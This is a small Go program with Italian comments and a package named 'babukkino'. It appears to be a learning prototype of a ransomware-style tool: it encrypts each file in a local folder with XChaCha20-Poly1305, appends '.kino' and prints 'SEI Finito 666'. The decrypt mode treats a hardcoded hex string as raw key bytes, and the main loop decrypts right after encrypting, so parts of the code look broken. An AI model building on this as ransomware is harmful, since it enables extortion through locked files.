// TODO
// - 1 leggere la cartella e creare un array di file
// - 2 per ogni file cifrarlo con un nonce differente
// - 3 salvare il file cifrato con il nome originale + .kino
// note: utilizziamo xchacha20poly1305

package main

import (
	"babukkino/dec"
	"babukkino/enc"
	"crypto/rand"
	"fmt"
	"log"
	"os"
	"runtime"
)

func main() {
	// mostra numero CPU disponibili
	println("Numero CPU disponibili: ", runtime.NumCPU())

	// 1 lettura dei file nella cartella
	plainFiles, err := os.ReadDir("./ciframi")
	if err != nil {
		println("Errore nella lettura della cartella")
		log.Fatal(err)
	}

	if len(os.Args) > 1 && os.Args[1] == "-d" {
		for _, file := range plainFiles {

			//convery key to byte
			key := []byte("070a1773b1c44cdf3fa0cb04d054528924f643ac63516a6a3009983b994fde20")
			println(file.Name())
			dec.DecryptFile("./cifrati/"+file.Name()+".kino", file.Name(), key)
		}
		return
	}

	// 2 generazione chiave simmetrica
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		log.Fatal(err)
	}

	keyString := fmt.Sprintf("%x", key)

	//mostra chiave simmetrica
	println("Chiave simmetrica: ", keyString)
	// salva su file la chiave simmetrica
	if err := os.WriteFile("./key.txt", key, 0644); err != nil {
		log.Fatal(err)
	}

	// Mostrami i nomi dei file nella cartella
	for _, file := range plainFiles {
		println(file.Name())

		enc.EncryptFile("./ciframi/"+file.Name(), file.Name(), key)
		dec.DecryptFile("./cifrati/", file.Name(), key)
	}

	println("SEI Finito 666")
}
